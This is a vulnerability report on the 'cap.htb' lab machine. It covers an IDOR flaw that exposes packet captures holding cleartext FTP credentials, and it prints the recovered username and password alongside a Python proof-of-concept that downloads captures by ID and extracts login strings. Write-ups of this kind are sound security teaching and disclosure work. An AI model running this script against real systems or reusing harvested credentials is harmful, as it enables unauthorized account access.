# Information Disclosure - FTP Credentials Exposed in Network Capture Files

**ID:** vuln-0001
**Severity:** CRITICAL
**Found:** 2026-02-22 16:01:02 UTC
**Target:** http://cap.htb
**CWE:** CWE-200
**CVSS:** 9.1

## Description

A critical information disclosure vulnerability was identified in the Security Dashboard application. The application allows users to download network packet capture (PCAP) files via the `/download/{id}` endpoint. Analysis of these PCAP files revealed cleartext FTP credentials being transmitted over the network.

The vulnerability exists because:
1. The application generates and stores PCAP files containing network traffic captures
2. These captures include sensitive authentication data (FTP credentials) transmitted in cleartext
3. The `/download/{id}` endpoint lacks proper access controls, allowing unauthorized access to other users' capture files (IDOR vulnerability)
4. The FTP service uses unencrypted authentication, exposing credentials in network traffic

## Impact

Successful exploitation allows an attacker to:

- Access other users' network capture files through IDOR on the `/download/{id}` endpoint
- Extract cleartext credentials from PCAP files including FTP usernames and passwords
- Compromise user accounts and gain unauthorized system access
- Access sensitive files on the system (user.txt flag retrieved via FTP)
- Potentially escalate privileges if captured credentials have higher privileges

The discovered credentials (nathan / Buck3tH4TF0RM3!) provided access to the FTP service and allowed retrieval of the user.txt flag, demonstrating complete compromise of the user account.

## Technical Analysis

The root cause of this vulnerability is a combination of factors:

1. **IDOR (Insecure Direct Object Reference)**: The `/download/{id}` and `/data/{id}` endpoints accept numeric IDs without proper authorization checks. By iterating through different ID values, an attacker can access data and downloads belonging to other users.

2. **Cleartext Protocol Usage**: The FTP service (port 21) transmits authentication credentials in cleartext, allowing anyone with access to network traffic captures to extract usernames and passwords.

3. **Information Disclosure in Logs**: The network capture files stored by the application contain complete packet data including application-layer protocols, exposing sensitive authentication information.

4. **Lack of Data Sanitization**: The application does not sanitize or filter sensitive data from captured network traffic before storing and serving it to users.

The vulnerable endpoints are:
- `GET /data/{id}` - Displays packet statistics for capture ID
- `GET /download/{id}` - Downloads the raw PCAP file for capture ID

Both endpoints return 200 OK for IDs 0 and 1, containing different users' capture data.

#!/usr/bin/env python3
"""
Proof of Concept - Extract FTP credentials from CAP HTB PCAP files
This script demonstrates the information disclosure vulnerability
"""

import struct
import sys

def extract_strings(data, min_length=4):
    """Extract printable strings from binary data"""
    result = []
    current = ""
    for b in data:
        if 32 <= b <= 126:
            current += chr(b)
        else:
            if len(current) >= min_length:
                result.append(current)
            current = ""
    if len(current) >= min_length:
        result.append(current)
    return result

def analyze_pcap(filepath):
    """Extract credentials from PCAP file"""
    print(f"[+] Analyzing {filepath}")
    
    with open(filepath, 'rb') as f:
        # Verify PCAP magic number
        header = f.read(24)
        if len(header) < 24:
            print("[-] Invalid PCAP file")
            return
        
        magic = header[0:4]
        if magic not in [b'\xd4\xc3\xb2\xa1', b'\xa1\xb2\xc3\xd4']:
            print("[-] Not a valid PCAP file")
            return
        
        # Read all packet data
        all_data = b""
        while True:
            pkt_header = f.read(16)
            if len(pkt_header) < 16:
                break
            incl_len = struct.unpack('<I', pkt_header[8:12])[0]
            pkt_data = f.read(incl_len)
            all_data += pkt_data
        
        # Extract strings and look for credentials
        strings = extract_strings(all_data)
        
        credentials = []
        for i, s in enumerate(strings):
            s_lower = s.lower()
            if 'user ' in s_lower or 'pass ' in s_lower:
                credentials.append(s)
        
        if credentials:
            print("[!] CREDENTIALS FOUND:")
            for c in credentials:
                print(f"    {c}")
        
        return credentials

def download_pcap(target, id_val, output_file):
    """Download PCAP from target"""
    import urllib.request
    
    url = f"http://{target}/download/{id_val}"
    print(f"[+] Downloading from {url}")
    
    try:
        urllib.request.urlretrieve(url, output_file)
        print(f"[+] Saved to {output_file}")
        return True
    except Exception as e:
        print(f"[-] Download failed: {e}")
        return False

if __name__ == "__main__":
    TARGET = "cap.htb"
    
    # Download PCAP files for different IDs
    for i in [0, 1]:
        output = f"download_{i}.pcap"
        if download_pcap(TARGET, i, output):
            analyze_pcap(output)

## Remediation

1. **Implement Proper Authorization**: Add authorization checks to the `/data/{id}` and `/download/{id}` endpoints to ensure users can only access their own capture files. Validate the authenticated user's ownership of the requested resource ID.

2. **Use Secure Protocols**: Replace FTP with SFTP or FTPS to encrypt authentication credentials and prevent cleartext transmission over the network.

3. **Data Sanitization**: Implement filters to remove or mask sensitive information (passwords, tokens, keys) from stored network captures before making them available for download.

4. **Access Control**: Implement role-based access control (RBAC) to restrict access to network capture functionality to authorized users only.

5. **Secure Storage**: Encrypt stored PCAP files at rest and ensure they are stored outside the web root with access controlled through secure APIs.

6. **Input Validation**: Validate and sanitize the ID parameter to prevent directory traversal and ensure only valid numeric IDs are accepted.
